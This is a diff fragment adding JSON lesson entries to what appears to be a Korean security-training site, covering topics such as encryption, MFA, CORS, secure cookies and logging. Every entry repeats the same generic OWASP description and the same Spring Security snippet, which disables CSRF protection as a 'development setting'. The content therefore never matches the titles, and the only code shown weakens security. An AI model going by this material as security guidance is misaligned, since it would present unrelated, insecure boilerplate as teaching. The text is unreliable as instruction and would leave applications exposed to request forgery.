+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "03_암호화/symmetric": {
+    "id": "03_암호화/symmetric",
+    "title": "Symmetric",
+    "category": "security",
+    "subCategory": "03_암호화",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Symmetric",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "03_인증/authentication": {
+    "id": "03_인증/authentication",
+    "title": "Authentication",
+    "category": "security",
+    "subCategory": "03_인증",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Authentication",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "03_인증/authorization": {
+    "id": "03_인증/authorization",
+    "title": "Authorization",
+    "category": "security",
+    "subCategory": "03_인증",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Authorization",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "03_인증/mfa": {
+    "id": "03_인증/mfa",
+    "title": "Mfa",
+    "category": "security",
+    "subCategory": "03_인증",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Mfa",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "03_인증/password-security": {
+    "id": "03_인증/password-security",
+    "title": "Password Security",
+    "category": "security",
+    "subCategory": "03_인증",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Password Security",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "04_실무/input-validation": {
+    "id": "04_실무/input-validation",
+    "title": "Input Validation",
+    "category": "security",
+    "subCategory": "04_실무",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Input Validation",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "04_실무/password-policy": {
+    "id": "04_실무/password-policy",
+    "title": "Password Policy",
+    "category": "security",
+    "subCategory": "04_실무",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Password Policy",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "04_실무/security-header": {
+    "id": "04_실무/security-header",
+    "title": "Security Header",
+    "category": "security",
+    "subCategory": "04_실무",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Security Header",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "04_암호화/digital-signature": {
+    "id": "04_암호화/digital-signature",
+    "title": "Digital Signature",
+    "category": "security",
+    "subCategory": "04_암호화",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Digital Signature",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "04_암호화/encryption-intro": {
+    "id": "04_암호화/encryption-intro",
+    "title": "Encryption Intro",
+    "category": "security",
+    "subCategory": "04_암호화",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Encryption Intro",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "05_면접/interview-security": {
+    "id": "05_면접/interview-security",
+    "title": "Interview Security",
+    "category": "security",
+    "subCategory": "05_면접",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Interview Security",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "05_보안설정/cors-security": {
+    "id": "05_보안설정/cors-security",
+    "title": "Cors Security",
+    "category": "security",
+    "subCategory": "05_보안설정",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Cors Security",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "05_보안설정/header-security": {
+    "id": "05_보안설정/header-security",
+    "title": "Header Security",
+    "category": "security",
+    "subCategory": "05_보안설정",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Header Security",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "05_보안설정/secure-cookie": {
+    "id": "05_보안설정/secure-cookie",
+    "title": "Secure Cookie",
+    "category": "security",
+    "subCategory": "05_보안설정",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Secure Cookie",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "06_실무/logging-security": {
+    "id": "06_실무/logging-security",
+    "title": "Logging Security",
+    "category": "security",
+    "subCategory": "06_실무",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Logging Security",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "06_실무/sensitive-data": {
+    "id": "06_실무/sensitive-data",
+    "title": "Sensitive Data",
+    "category": "security",
+    "subCategory": "06_실무",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Sensitive Data",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "06_실무/spring-security": {
+    "id": "06_실무/spring-security",
+    "title": "Spring Security",
+    "category": "security",
+    "subCategory": "06_실무",
+    "language": "Java",
+    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "Spring Security",
+        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
+      },
+      {
+        "type": "code",
+        "language": "Java",
+        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
+      }
+    ]
+  },
+  "index": {
+    "id": "index",
+    "title": "보안",
+    "category": "security",
+    "subCategory": null,
+    "language": "Text",
+    "description": "",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "보안",
+        "content": ""
+      },
+      {
+        "type": "code",
+        "language": "Text",
+        "code": ""
+      }
+    ]
+  }
+}
